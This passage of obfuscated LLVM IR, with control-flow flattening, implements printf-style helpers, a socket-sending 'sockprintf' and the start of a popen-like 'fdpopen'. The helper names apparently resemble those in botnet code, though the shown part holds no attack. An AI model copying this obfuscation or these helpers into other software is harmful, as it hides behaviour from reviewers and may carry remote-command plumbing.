; <label>:232:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %233 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %234 = load i8*, i8** %233, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %235 = getelementptr i8, i8* %234, i32 %.reload63
  %236 = bitcast i8* %235 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %237 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %237, i32* %.reload59, align 8
  store i32 -2142588127, i32* %switchVar
  store i32* %236, i32** %.reg2mem88
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %239 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %240 = load i8*, i8** %239, align 8
  %241 = bitcast i8* %240 to i32*
  %242 = getelementptr i8, i8* %240, i32 8
  store i8* %242, i8** %239, align 8
  store i32 -2142588127, i32* %switchVar
  store i32* %241, i32** %.reg2mem88
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %244 = load i32, i32* %.reload89, align 4
  %245 = load i32, i32* %7, align 4
  %246 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %247 = call i32 @printi(i8** %.reload53, i32 %244, i32 10, i32 0, i32 %245, i32 %246, i32 97)
  %248 = load i32, i32* %9, align 4
  %249 = add nsw i32 %248, %247
  store i32 %249, i32* %9, align 4
  store i32 450106877, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8*, i8** %5, align 8
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 99
  %255 = select i1 %254, i32 -602039515, i32 -1545964713
  store i32 %255, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %257, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %258 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %258, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %259 = load i32, i32* %.reload71, align 8
  store i32 %259, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %260 = icmp ule i32 %.reload75, 40
  %261 = select i1 %260, i32 -499776367, i32 1620199876
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %263 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %264 = load i8*, i8** %263, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %265 = getelementptr i8, i8* %264, i32 %.reload74
  %266 = bitcast i8* %265 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %267 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %267, i32* %.reload70, align 8
  store i32 -1830019946, i32* %switchVar
  store i32* %266, i32** %.reg2mem90
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %269 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %270 = load i8*, i8** %269, align 8
  %271 = bitcast i8* %270 to i32*
  %272 = getelementptr i8, i8* %270, i32 8
  store i8* %272, i8** %269, align 8
  store i32 -1830019946, i32* %switchVar
  store i32* %271, i32** %.reg2mem90
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %274 = load i32, i32* %.reload91, align 4
  %275 = trunc i32 %274 to i8
  %276 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %275, i8* %276, align 1
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %277, align 1
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @prints(i8** %278, i8* %279, i32 %280, i32 %281)
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, %282
  store i32 %284, i32* %9, align 4
  store i32 450106877, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 -1202204902, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 1971539102, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8**, i8*** %4, align 8
  %289 = load i8*, i8** %5, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  call void @printchar(i8** %288, i32 %291)
  %292 = load i32, i32* %9, align 4
  %293 = add nsw i32 %292, 1
  store i32 %293, i32* %9, align 4
  store i32 -1202204902, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 450106877, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i8*, i8** %5, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %5, align 8
  store i32 -1201103078, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = load i8**, i8*** %4, align 8
  %300 = icmp ne i8** %299, null
  %301 = select i1 %300, i32 -1702020580, i32 416327886
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i8**, i8*** %4, align 8
  %304 = load i8*, i8** %303, align 8
  store i8 0, i8* %304, align 1
  store i32 416327886, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %307 = bitcast %struct.__va_list_tag* %306 to i8*
  call void @llvm.va_end(i8* %307)
  %308 = load i32, i32* %9, align 4
  ret i32 %308

loopEnd:                                          ; preds = %302, %298, %295, %294, %287, %286, %285, %273, %268, %262, %256, %250, %243, %238, %232, %225, %219, %212, %207, %201, %194, %188, %181, %176, %170, %163, %157, %150, %145, %139, %132, %126, %120, %119, %117, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 243351702, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 243351702, label %first
    i32 -867425539, label %16
    i32 697229108, label %18
    i32 108243650, label %23
    i32 -229388871, label %26
    i32 743380572, label %29
    i32 102061505, label %34
    i32 981180027, label %35
    i32 2002078596, label %39
    i32 678077041, label %44
    i32 -1644260844, label %45
    i32 -813887082, label %46
    i32 770321678, label %51
    i32 668642363, label %52
    i32 -816370180, label %56
    i32 526803542, label %61
    i32 1139648401, label %64
    i32 -1886443964, label %65
    i32 582226963, label %66
    i32 -470541993, label %71
    i32 469541264, label %78
    i32 120928813, label %81
    i32 -1554037473, label %82
    i32 -1921587213, label %86
    i32 1800678847, label %91
    i32 -830645726, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 -867425539, i32 -813887082
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 697229108, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 108243650, i32 743380572
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -229388871, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 697229108, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 102061505, i32 981180027
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 2002078596, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 2002078596, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 678077041, i32 -1644260844
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 -1644260844, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -813887082, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -1886443964, i32 770321678
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 668642363, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -816370180, i32 1139648401
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 526803542, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 668642363, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -1886443964, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 582226963, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 -470541993, i32 120928813
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 469541264, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 582226963, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1554037473, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 -1921587213, i32 -830645726
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 1800678847, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 -1554037473, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -990422403, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -990422403, label %first
    i32 -748500383, label %26
    i32 912378521, label %34
    i32 429050050, label %38
    i32 -1146428125, label %42
    i32 1984611442, label %46
    i32 1168507896, label %49
    i32 1930082574, label %54
    i32 -1492874588, label %58
    i32 899392396, label %65
    i32 1760825202, label %71
    i32 1566664322, label %80
    i32 1613197311, label %84
    i32 -764933617, label %88
    i32 -349069527, label %93
    i32 1664022166, label %99
    i32 2003961043, label %102
    i32 -1265423510, label %103
    i32 -1164868972, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -748500383, i32 912378521
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 -1164868972, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 429050050, i32 1168507896
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -1146428125, i32 1168507896
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 1984611442, i32 1168507896
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 1168507896, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 1930082574, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -1492874588, i32 1566664322
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 899392396, i32 1760825202
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 1760825202, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 1930082574, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1613197311, i32 -1265423510
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -764933617, i32 1664022166
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -349069527, i32 1664022166
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 2003961043, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 2003961043, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 -1265423510, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 -1164868972, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 2038157066, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2038157066, label %first
    i32 -786243885, label %8
    i32 564602451, label %16
    i32 -1466814605, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 -786243885, i32 564602451
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 -1466814605, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 -1466814605, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1639326422, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 1639326422, label %first
    i32 -1460467990, label %15
    i32 -519969227, label %21
    i32 1494214215, label %28
    i32 1575267309, label %29
    i32 1699645429, label %34
    i32 -1653208788, label %35
    i32 990152016, label %39
    i32 -1213468266, label %43
    i32 1480491155, label %44
    i32 -1688564705, label %54
    i32 499534579, label %55
    i32 270486543, label %61
    i32 1100368071, label %NodeBlock
    i32 475941305, label %LeafBlock1
    i32 -614577492, label %LeafBlock
    i32 -420756667, label %66
    i32 158050119, label %73
    i32 -135845205, label %79
    i32 -1216727157, label %84
    i32 -201203721, label %91
    i32 -2094960697, label %95
    i32 -1371106369, label %100
    i32 2121226371, label %107
    i32 -1797990437, label %111
    i32 -1899432781, label %NewDefault
    i32 1835496631, label %114
    i32 425136638, label %120
    i32 -520679009, label %126
    i32 1072718024, label %132
    i32 1976675634, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 -1460467990, i32 -519969227
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 1494214215, i32 -519969227
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 1494214215, i32 1575267309
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 1976675634, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
